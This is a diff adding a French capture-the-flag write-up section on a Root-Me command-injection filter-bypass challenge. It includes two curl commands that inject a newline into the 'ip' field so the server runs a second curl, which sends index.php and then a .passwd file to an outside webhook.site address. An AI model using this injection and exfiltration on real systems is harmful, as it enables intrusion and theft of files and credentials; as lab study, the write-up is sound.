@@ -89,3 +89,30 @@ http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC,%20(C
 
 <img src="img/SQL injection - Error 6.png" alt="capture 14" width="400">
 
+# 8. Injection de commande - Contournement de filtre
+link: https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre
+
+Pour réaliser ce projet, ont a essayé de curl l'index.php pour récupérer son contenu avec la commande suivante :
+
+curl -X POST "http://challenge01.root-me.org/web-serveur/ch53/index.php" -d "ip=127.0.0.1%0acurl+--data+'@index.php'+https://https://webhook.site/763b03a2-df25-49a9-bab6-28d541205452"
+
+Dans cette commande, on utilise l'injection de commande pour exécuter une deuxième commande curl qui envoie le contenu de index.php vers webhook.site.
+
+<img src="img/Injection de commande - Contournement de filtre 1.png" alt="capture 15" width="400">
+
+On peut voir que le contenu de index.php a bien été envoyé vers webhook.site.
+
+<img src="img/Injection de commande - Contournement de filtre 2.png" alt="capture 16" width="400">
+
+Nous pouvons voir que dans le contenu il y a un élément qui ce nome .passwd.
+
+Nous avons donc relancé une commande curl pour récupérer le contenu du .passwd.
+
+Commande utilisée :
+curl -X POST "http://challenge01.root-me.org/web-serveur/ch53/index.php" -d "ip=127.0.0.1%0acurl+--data+'@.passwd'+https://https://webhook.site/763b03a2-df25-49a9-bab6-28d541205452"
+
+<img src="img/Injection de commande - Contournement de filtre 3.png" alt="capture 17" width="400">
+
+Nous pouvons voir que le mot de passe est bien récupéré.
+
+<img src="img/Injection de commande - Contournement de filtre 4.png" alt="capture 18" width="400">
